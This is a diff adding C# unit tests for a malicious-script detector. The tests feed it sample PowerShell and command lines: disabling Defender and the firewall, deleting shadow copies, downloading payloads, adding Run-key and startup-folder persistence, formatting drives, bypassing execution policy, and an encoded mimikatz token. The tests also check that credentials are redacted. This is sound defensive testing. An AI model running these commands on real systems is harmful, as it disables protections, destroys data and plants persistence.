@@ -1718,6 +1718,20 @@ public class DetectionDetailsTests
         var analysis = new FileAnalysis
         {
             SecurityFindings = new[] { "ps:encoded", "html:ext-links=2" },
+            SecurityFindingEvidence = new[]
+            {
+                new FindingEvidence
+                {
+                    Code = "ps:encoded",
+                    Line = 7,
+                    Snippet = "powershell -EncodedCommand ...",
+                    SourceTag = "script:line",
+                    HitCount = 2,
+                    Lines = new[] { 7, 8 },
+                    Snippets = new[] { "powershell -EncodedCommand ...", "[Convert]::FromBase64String(...)" },
+                    BehaviorTags = new[] { "Obfuscation", "Execution" }
+                }
+            },
             InnerFindings = new[] { "tool:setup.exe" }
         };
 
@@ -1728,16 +1742,655 @@ public class DetectionDetailsTests
         Assert.Equal("ps:encoded", rv.SecurityFindingDetails[0].Code);
         Assert.Equal("PowerShell encoded payload", rv.SecurityFindingDetails[0].SummaryShort);
         Assert.Equal("Script", rv.SecurityFindingDetails[0].Category);
+        Assert.Equal(7, rv.SecurityFindingDetails[0].Line);
+        Assert.Equal("powershell -EncodedCommand ...", rv.SecurityFindingDetails[0].Snippet);
+        Assert.Equal("script:line", rv.SecurityFindingDetails[0].SourceTag);
+        Assert.Equal(2, rv.SecurityFindingDetails[0].HitCount);
+        Assert.Equal(new[] { 7, 8 }, rv.SecurityFindingDetails[0].Lines);
+        Assert.Equal(new[] { "Obfuscation", "Execution" }, rv.SecurityFindingDetails[0].BehaviorTags);
         Assert.NotNull(rv.InnerFindingDetails);
         Assert.Single(rv.InnerFindingDetails!);
         Assert.Equal("tool:setup.exe", rv.InnerFindingDetails[0].Code);
         Assert.Contains("Known tool detected by name", rv.InnerFindingDetails[0].SummaryLong!, StringComparison.OrdinalIgnoreCase);
 
         var map = rv.ToDictionary();
+        var evidence = Assert.IsAssignableFrom<IReadOnlyList<FindingEvidence>>(map["SecurityFindingEvidence"]);
+        Assert.Single(evidence);
         var security = Assert.IsAssignableFrom<IReadOnlyList<FindingView>>(map["SecurityFindingDetails"]);
         Assert.Equal(2, security.Count);
         var inner = Assert.IsAssignableFrom<IReadOnlyList<FindingView>>(map["InnerFindingDetails"]);
         Assert.Single(inner);
+    }
+
+    [Fact]
+    public void Analyze_ScriptRiskEvidence_Records_Source_Line_And_Redacted_Snippet()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(
+                p,
+                "$secret = \"abc123\"\n" +
+                "Invoke-WebRequest https://example.test/payload.ps1 -Headers @{ Authorization = \"Bearer abc123\" }\n" +
+                "Set-MpPreference -DisableRealtimeMonitoring $true\n" +
+                "Add-MpPreference -ExclusionPath C:\\Temp\n" +
+                "vssadmin delete shadows /all /quiet\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.NotNull(analysis.SecurityFindings);
+            Assert.Contains("ps:web-dl", analysis.SecurityFindings!);
+            Assert.Contains("script:defender-tamper", analysis.SecurityFindings!);
+            Assert.Contains("script:vssadmin-shadows", analysis.SecurityFindings!);
+            Assert.NotNull(analysis.SecurityFindingEvidence);
+            var defender = Assert.Single(analysis.SecurityFindingEvidence!, item => item.Code == "script:defender-tamper");
+            Assert.Equal(3, defender.Line);
+            Assert.Contains("Set-MpPreference", defender.Snippet);
+            Assert.Equal(2, defender.HitCount);
+            Assert.Equal(new[] { 3, 4 }, defender.Lines);
+            Assert.Equal(new[] { "DefenseEvasion" }, defender.BehaviorTags);
+            Assert.NotNull(defender.Snippets);
+            Assert.Equal(2, defender.Snippets!.Count);
+            var web = Assert.Single(analysis.SecurityFindingEvidence!, item => item.Code == "ps:web-dl");
+            Assert.Equal(2, web.Line);
+            Assert.Contains("<redacted>", web.Snippet);
+            Assert.DoesNotContain("abc123", web.Snippet);
+            Assert.DoesNotContain("Bearer", web.Snippet, StringComparison.OrdinalIgnoreCase);
+
+            var report = ReportView.From(analysis);
+            Assert.NotNull(report.SecurityFindingDetails);
+            var detail = Assert.Single(report.SecurityFindingDetails!, item => item.Code == "script:vssadmin-shadows");
+            Assert.Equal(5, detail.Line);
+            Assert.Contains("vssadmin delete shadows", detail.Snippet, StringComparison.OrdinalIgnoreCase);
+            Assert.Equal(new[] { "Destructive", "Impact" }, detail.BehaviorTags);
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_FromCharCode_Requires_More_Than_Twenty_Occurrences()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".js");
+        try
+        {
+            File.WriteAllText(
+                p,
+                string.Join("\n", Enumerable.Range(0, 20).Select(i => $"String.fromCharCode({65 + i % 26});")));
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.DoesNotContain("js:fromcharcode", analysis.SecurityFindings ?? Array.Empty<string>());
+            Assert.DoesNotContain(
+                analysis.SecurityFindingEvidence ?? Array.Empty<FindingEvidence>(),
+                item => item.Code == "js:fromcharcode");
+
+            File.WriteAllText(
+                p,
+                string.Join("\n", Enumerable.Range(0, 21).Select(i => $"String.fromCharCode({65 + i % 26});")));
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("js:fromcharcode", analysis.SecurityFindings ?? Array.Empty<string>());
+            Assert.Contains(
+                analysis.SecurityFindingEvidence ?? Array.Empty<FindingEvidence>(),
+                item => item.Code == "js:fromcharcode");
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_PlaintextCredential_Evidence_Does_Not_Expose_Snippets()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(p, "$secure = ConvertTo-SecureString 'example-value' -AsPlainText -Force\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:plaintext-credential", analysis.SecurityFindings ?? Array.Empty<string>());
+            var evidence = Assert.Single(
+                analysis.SecurityFindingEvidence ?? Array.Empty<FindingEvidence>(),
+                item => item.Code == "script:plaintext-credential");
+            Assert.Equal(1, evidence.Line);
+            Assert.Null(evidence.Snippet);
+            Assert.Null(evidence.Snippets);
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_RecursiveForceDelete_Requires_Recursive_Delete_Context()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(p, "Remove-Item $tempFile -Force\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.DoesNotContain("script:recursive-force-delete", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "Remove-Item C:\\Temp -Recurse -Force\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:recursive-force-delete", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_CredentialDumpSignature_Suppresses_Generic_Dump_Hint()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            var token = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("bWltaWthdHo="));
+            File.WriteAllText(p, token);
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("sig:X1001", analysis.SecurityFindings ?? Array.Empty<string>());
+            Assert.DoesNotContain("script:credential-dump-hint", analysis.SecurityFindings ?? Array.Empty<string>());
+            Assert.DoesNotContain(
+                analysis.SecurityFindingEvidence ?? Array.Empty<FindingEvidence>(),
+                item => item.Code == "script:credential-dump-hint");
+
+            var assessed = FileInspector.Assess(analysis);
+
+            Assert.Contains("Sig.MimikatzEncodedHint", assessed.Codes);
+            Assert.DoesNotContain("Sig.CredentialDumpHint", assessed.Codes);
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_IndirectExecution_Requires_Command_Host_Token()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".js");
+        try
+        {
+            File.WriteAllText(p, "var shell = new ActiveXObject('WScript.Shell');\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("js:activex", analysis.SecurityFindings ?? Array.Empty<string>());
+            Assert.DoesNotContain("script:indirect-exec", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "new ActiveXObject('WScript.Shell').Run('cscript.exe payload.vbs');\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:indirect-exec", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "mshta.exe https://example.test/payload.hta\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("js:mshta", analysis.SecurityFindings ?? Array.Empty<string>());
+            Assert.DoesNotContain("script:indirect-exec", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_DefenderTamper_Requires_Weakening_Flags()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(p, "Set-MpPreference -ScanScheduleDay 1\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.DoesNotContain("script:defender-tamper", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "Set-MpPreference -DisableRealtimeMonitoring $true\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:defender-tamper", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_DefenderTamper_Ignores_Disable_Flags_Set_To_False()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(
+                p,
+                "Set-MpPreference -DisableRealtimeMonitoring $false\n" +
+                "Set-MpPreference -DisableIOAVProtection:$false\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.DoesNotContain("script:defender-tamper", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_DefenderTamper_Scopes_False_Suppression_Per_Parameter()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(
+                p,
+                "Set-MpPreference -DisableRealtimeMonitoring $false -DisableIOAVProtection $true\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:defender-tamper", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_DefenderTamper_Detects_Backtick_Continued_Commands()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(
+                p,
+                "Set-MpPreference `\n" +
+                "  -DisableRealtimeMonitoring $true\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:defender-tamper", analysis.SecurityFindings ?? Array.Empty<string>());
+            var defender = Assert.Single(
+                analysis.SecurityFindingEvidence ?? Array.Empty<FindingEvidence>(),
+                item => item.Code == "script:defender-tamper");
+            Assert.Equal(1, defender.Line);
+            Assert.Contains("-DisableRealtimeMonitoring", defender.Snippet);
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_WebDownloadEvidence_Redacts_Quoted_Authorization_Keys()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(
+                p,
+                "Invoke-WebRequest https://example.test/api -Headers @{ \"Authorization\" = \"Basic dXNlcjpwYXNz\" }\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            var web = Assert.Single(
+                analysis.SecurityFindingEvidence ?? Array.Empty<FindingEvidence>(),
+                item => item.Code == "ps:web-dl");
+            Assert.Contains("<redacted>", web.Snippet);
+            Assert.DoesNotContain("dXNlcjpwYXNz", web.Snippet);
+            Assert.DoesNotContain("Basic", web.Snippet, StringComparison.OrdinalIgnoreCase);
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_WebDownloadEvidence_Redacts_Signed_Url_Query_Secrets()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(
+                p,
+                "Invoke-WebRequest 'https://example.blob.core.windows.net/container/file.txt?sp=r&sig=secretSignatureValue&se=2030-01-01'\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            var web = Assert.Single(
+                analysis.SecurityFindingEvidence ?? Array.Empty<FindingEvidence>(),
+                item => item.Code == "ps:web-dl");
+            Assert.Contains("sig=<redacted>", web.Snippet);
+            Assert.DoesNotContain("secretSignatureValue", web.Snippet);
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_WebDownloadEvidence_Redacts_Underscored_Private_Key_Assignments()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(
+                p,
+                "Invoke-WebRequest https://example.test/upload -Body @{ 'private_key' = 'PRIVATE-SECRET' }\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            var web = Assert.Single(
+                analysis.SecurityFindingEvidence ?? Array.Empty<FindingEvidence>(),
+                item => item.Code == "ps:web-dl");
+            Assert.Contains("<redacted>", web.Snippet);
+            Assert.DoesNotContain("PRIVATE-SECRET", web.Snippet);
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_WebDownloadEvidence_Redacts_Url_UserInfo_Credentials()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(
+                p,
+                "Invoke-WebRequest https://user:P@ssw0rd@example.com/payload.ps1\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            var web = Assert.Single(
+                analysis.SecurityFindingEvidence ?? Array.Empty<FindingEvidence>(),
+                item => item.Code == "ps:web-dl");
+            Assert.Contains("https://<redacted>@example.com/payload.ps1", web.Snippet);
+            Assert.DoesNotContain("user:P@ssw0rd", web.Snippet);
+            Assert.DoesNotContain("P@ssw0rd", web.Snippet);
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_PowerShellBitsTransfer_Is_Detected()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(p, "Start-BitsTransfer -Source https://example.test/payload.bin -Destination payload.bin\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:bitsadmin-transfer", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_Bcdedit_Requires_Mutating_Option()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".cmd");
+        try
+        {
+            File.WriteAllText(p, "bcdedit /enum\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.DoesNotContain("script:bcdedit", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "bcdedit /export C:\\bcd-backup\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.DoesNotContain("script:bcdedit", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "bcdedit /set {current} recoveryenabled No\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:bcdedit", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_AttribHidden_Detects_Hidden_Flag_When_Combined_With_Other_Attributes()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".cmd");
+        try
+        {
+            File.WriteAllText(p, "attrib +s +h payload.exe\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:attrib-hidden", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_RunKeyPersistence_Requires_Mutation_Context()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(p, "Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.DoesNotContain("script:registry-run-key", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name Example -Value payload.exe\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:registry-run-key", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_StartupFolderPersistence_Requires_Mutation_Context()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(p, "Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.DoesNotContain("script:startup-folder", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "Copy-Item payload.lnk \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.lnk\"\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:startup-folder", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_DiskPart_Format_Syntax_Is_Detected_As_Format_Drive()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".txt");
+        try
+        {
+            File.WriteAllText(p, "select volume 3\nformat fs=ntfs label=Backup quick\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:format-drive", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_FormatDrive_Detects_Any_Windows_Drive_Letter()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".cmd");
+        try
+        {
+            File.WriteAllText(p, "format X: /FS:NTFS /Q\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:format-drive", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_FirewallTamper_Detects_NetshExe_And_PowerShell_Disables()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(p, "netsh.exe advfirewall set allprofiles state off\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:defender-tamper", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:defender-tamper", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_Pinvoke_Requires_Native_Invocation_Context()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(p, "Get-FileHash $env:windir\\System32\\kernel32.dll\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.DoesNotContain("script:pinvoke", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "Add-Type '[DllImport(\"user32.dll\")] public static extern int GetForegroundWindow();'\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:pinvoke", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_ExecutionPolicyBypass_Detects_Process_Parameters()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(p, "powershell.exe -ExecutionPolicy Bypass -File .\\payload.ps1\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:execution-policy-bypass", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:execution-policy-bypass", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "pwsh -ep Unrestricted -File ./payload.ps1\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:execution-policy-bypass", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
+    }
+
+    [Fact]
+    public void Analyze_RegistryModification_Requires_Registry_Path_For_ItemProperty()
+    {
+        var p = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".ps1");
+        try
+        {
+            File.WriteAllText(p, "Set-ItemProperty -Path C:\\GroupFiles\\final.doc -Name IsReadOnly -Value $true\n");
+
+            var analysis = FileInspector.Analyze(p);
+
+            Assert.DoesNotContain("script:registry-modify", analysis.SecurityFindings ?? Array.Empty<string>());
+
+            File.WriteAllText(p, "Set-ItemProperty -Path HKLM:\\Software\\Example -Name Enabled -Value 1\n");
+
+            analysis = FileInspector.Analyze(p);
+
+            Assert.Contains("script:registry-modify", analysis.SecurityFindings ?? Array.Empty<string>());
+        }
+        finally
+        {
+            if (File.Exists(p)) File.Delete(p);
+        }
     }
 
     [Fact]
